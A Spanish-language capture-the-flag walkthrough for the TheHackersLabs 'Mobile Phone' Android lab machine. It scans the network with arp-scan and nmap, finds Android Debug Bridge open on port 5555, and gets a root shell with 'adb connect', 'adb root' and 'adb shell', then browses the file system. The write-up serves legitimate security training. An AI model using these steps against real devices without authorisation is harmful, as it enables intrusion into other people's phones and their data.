Lo primero que haremos sera ir a la pagina de "TheHackersLabs" y concretamente a la siguiente direccion para descargar la maquina "Mobile Phone":

https://thehackerslabs.com/wp-content/uploads/2024/06/The%20Hackers%20Labs%20-%20Mobile%20Phone.zip

Una vez descargada (es una ".ova"), y montada en nuestro programa de maquinas virtuales, empezaremos usando un ARP-SCAN (o NETDISCOVER) para hallar la IP de la maquina victima:
```
arp-scan -I eth0 --localnet
netdiscover -i eth0 -r 192.168.1.0/24
```
Despues, pasaremos a realizar un NMAP:
```
nmap -p- --open -sS -sC -sV --min-rate 3000 -n -vvv -Pn IPMAQUINAVICTIMA -oN NOMBREDEARCHIVO
```
descubriendo el siguiente puerto abierto:
```
Discovered open port 5555/tcp on 192.168.1.145
```
En Android, el puerto 5555 es el puerto por defecto de "adb" que es una herramienta que se utiliza para conectar nuestro movil con nuestro PC, de tal forma que podamos cambiarle la ROM, o actualizar aplicaciones, entre otras cosas.

Como informacion adicional tenemos:
```
PORT     STATE SERVICE  REASON         VERSION
5555/tcp open  freeciv? syn-ack ttl 64
MAC Address: 08:00:27:97:06:EB (Oracle VirtualBox virtual NIC)
```
Bien, entonces vamos a ir a la pagina "HackTricks" para investigar un poco mas el servicio que corre por este puerto, y concretamente a esta direccion:
https://book.hacktricks.xyz/v/es/network-services-pentesting/5555-android-debug-bridge

Si leemos, vemos que tal y como hemos dicho al principio, este puerto hace referencia al Android Debug Bridge (adb), y que a dia de hoy, si se esta ejecutando este servicio y nos podemos conectar al dispositivo, es relativamente sencillo obtener una shell dentro del sistema.

Asi que vamos a probar si funciona, empezando por escribir en la terminal el comando:
```
adb connect 192.168.1.145   <=== Igual nos piden instalar "adb". OJO !!
```
recibiendo la siguiente informacion por pantalla:
```
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 192.168.1.145:5555
```
Perfecto, nuestro siguiente paso ahora seria intentar escalar privilegios y convertirnos en administrador "root". Para ello escribimos:
```
adb root
```
y parece que funciona:
```
restarting adbd as root
```
Y finalmente nos quedaria intentar conseguir una "shell", que haremos con el comando:
```
adb shell
```
Donde vemos que funciona, incluso pudiendo navegar perfectamente por sus directorios:
```
root@x86_64:/ # whoami
root

root@x86_64:/ # ls
acct
cache
charger
config
d
data
default.prop
dev
etc
file_contexts
fstab.android_x86_64
init
init.android_x86_64.rc
init.bluetooth.rc
init.environ.rc
init.rc
init.superuser.rc
init.trace.rc
init.usb.configfs.rc
init.usb.rc
init.zygote32.rc
init.zygote64_32.rc
lib
mnt
oem
proc
property_contexts
sbin
sdcard
seapp_contexts
selinux_version
sepolicy
service_contexts
storage
sys
system
ueventd.android_x86_64.rc
ueventd.rc
vendor

root@x86_64:/ # cd storage

root@x86_64:/storage # ls
emulated
self

root@x86_64:/storage # cd self
root@x86_64:/storage/self # ls
primary

root@x86_64:/storage/self # cd primary
root@x86_64:/storage/self/primary # ls
Alarms
Android
DCIM
Download
Movies
Music
Notifications
Pictures
Podcasts
Ringtones
storage

root@x86_64:/storage/self/primary # 
```
Y listo !! Ya tendriamos esta maquina Android hecha.
Como se ha visto, es una maquina muy sencillita y esta bien como primer contacto con Android, ya que con tres simples comandos hemos conseguido tener acceso total a ella.
